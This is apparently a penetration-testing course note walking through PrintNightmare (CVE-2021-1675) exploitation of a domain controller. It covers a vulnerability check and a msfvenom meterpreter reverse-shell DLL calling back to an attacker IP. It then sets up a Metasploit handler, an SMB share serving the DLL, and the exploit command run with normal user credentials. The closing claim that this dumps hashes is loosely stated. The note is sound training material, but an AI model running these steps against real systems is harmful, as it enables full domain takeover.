---
tags:
  - PEH
---
## Definition
PrintNightmare takes advantage of the Printer Spooler, which is related to printer and runs as system administrator.
## Executing PrintNightmare
1. Check if the DC vulnerable to PrintNightmare
```bash
rpcdump.py @<dc-ip> | egrep 'MS-RPRN|MS-PAR'

# If the output is as the following, then it's vulnerable
# Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
# Protocol: [MS-RPRN]: Print System Remote Protocol 
```
2. Create the payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<any> -f dll > shell.dll
```
3. Whenever you `msfvenom` then you should `msfconsole`
```bash
# Launch MS
msfconsole

# Use multi/handler
msf > use multi/handler

# Set the payload to (windows/x64/meterpreter/reverse_tcp), LHOST, LPORT
set payload <payload-above>
set <above> <value>
```
4. Now we want to share the dll file that we created file, we can do that through smbserver.py
```bash
smbserver.py share `pwd` -smb2support
```
5. Now that we have done all of the previous steps, we can utilize the CVE and user ANY NORMAL USER PASSWORD to dump the hashes of the DC!
```bash
python3 CVE-2021-1675 <domain-name>/<user>:<password>@<dc-ip> "\\<attacker's-ip>\share\shell.dll"
```